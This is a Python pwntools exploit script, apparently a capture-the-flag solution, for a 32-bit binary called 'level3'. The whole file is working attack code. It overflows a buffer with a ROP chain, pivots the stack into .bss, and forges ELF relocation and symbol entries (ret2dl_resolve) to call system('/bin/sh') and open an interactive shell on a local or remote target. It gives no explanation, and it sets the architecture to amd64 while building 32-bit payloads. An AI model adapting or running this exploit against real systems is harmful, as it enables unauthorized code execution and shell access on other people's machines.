#!/usr/bin/python
#__author__:TaQini

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64' # 'i386'

local_file  = './level3'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# elf, libc
read_plt = elf.symbols['read']
base_stage = elf.bss() + 0x800
pppr = 0x08048519 # pop esi ; pop edi ; pop ebp ; ret
pr = 0x0804851b # pop ebp ; ret
leave = 0x080483b8 # leave ; ret

# rop1
offset = 140
payload = 'A'*offset
payload += p32(read_plt) + p32(pppr) + p32(0) + p32(base_stage) + p32(100)
payload += p32(pr) + p32(base_stage) + p32(leave)

#debug()
sl(payload)

#sleep(20)

# pl2 
cmd = "/bin/sh"
plt_0 = 0x8048300
rel_plt = 0x080482b0
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481cc
dynstr = 0x0804822c
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) # align to 0x10
fake_sym_addr += align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)


payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += p32(0xdeadbeef)
payload2 += p32(base_stage + 80)
payload2 += p32(0xdeadbeef) * 2 # pppr 
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += 'system\0'
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))

sl(payload2)

p.interactive()

